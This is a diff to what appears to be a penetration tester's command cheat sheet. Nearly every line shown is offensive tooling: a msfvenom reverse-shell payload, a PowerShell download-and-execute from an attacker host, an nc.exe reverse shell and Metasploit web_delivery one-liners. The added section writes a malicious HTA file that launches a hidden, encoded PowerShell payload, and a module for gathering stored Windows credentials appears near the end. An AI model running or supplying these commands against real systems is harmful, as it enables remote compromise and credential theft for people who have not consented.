@@ -1699,6 +1699,12 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=$MYIP LPORT=7777 -f raw -o shel
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:53/resh.ps1');resh -Reverse $MYIP -Port 5555"
 \\$MYIP\$\nc.exe $MYIP 80 -e cmd
 
+-->> Web Delivery (PowerShell)
+msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SRVPORT 8080; setg LHOST $MYIP; setg LPORT 443; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
+
+-->> Create Malicious .hta Using Web Delivery
+echo '<!DOCTYPE html>\n<html>\n<head>\n<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no"/>\n<script language="VBScript">\nFunction X()\nDim XX\nSet XX = CreateObject("Wscript.Shell")\nXX.run "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGU<PAYLOAD_HERE>.......", 0, true\nEnd Function\nX\nself.close\n</script>\n</head>\n<body>\n</body>\n</html>' > /Upload/x.hta
+
 [*] File Transfer
 -->> Serve
 python3 -m http.server 139 /Upload
@@ -1872,7 +1878,7 @@ services.msc
 rlwrap msfconsole -q -x "use multi/handler; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; setg LHOST $MYIP; setg LPORT 4444; run"
 
 -->> Web Delivery
-msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; setg SRVPORT 53; setg LHOST $MYIP; setg LPORT 80; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
+msfconsole -q -x 'use exploit/multi/script/web_delivery; setg SESSION 1; setg SRVPORT 8080; setg LHOST $MYIP; setg LPORT 80; set TARGET PSH; setg PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
 
 +---------- Stored Credentials ----------+
 run post/windows/gather/credentials/windows_autologin
